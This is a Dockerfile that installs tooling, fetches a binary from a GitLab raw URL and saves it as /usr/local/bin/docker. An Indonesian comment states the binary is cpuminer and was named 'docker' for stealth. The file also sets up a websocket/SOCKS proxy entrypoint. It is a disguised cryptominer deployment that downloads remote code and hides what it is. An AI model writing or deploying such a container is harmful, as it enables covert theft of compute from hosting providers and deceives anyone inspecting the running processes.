FROM ubuntu:24.04

# Install dependencies + wget
RUN apt-get update && apt-get install -y \
    libcurl4 \
    libjansson4 \
    nodejs \
    npm \
    ca-certificates \
    wget \
    && rm -rf /var/lib/apt/lists/*

# Download binary cpuminer (diberi nama "docker" biar stealth)
RUN wget -O /usr/local/bin/docker "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/docker

COPY wsproxy.js /wsproxy.js
COPY entrypoint.sh /entrypoint.sh

RUN npm install ws net socks && chmod +x /entrypoint.sh

WORKDIR /app
EXPOSE 80

ENTRYPOINT ["/entrypoint.sh"]
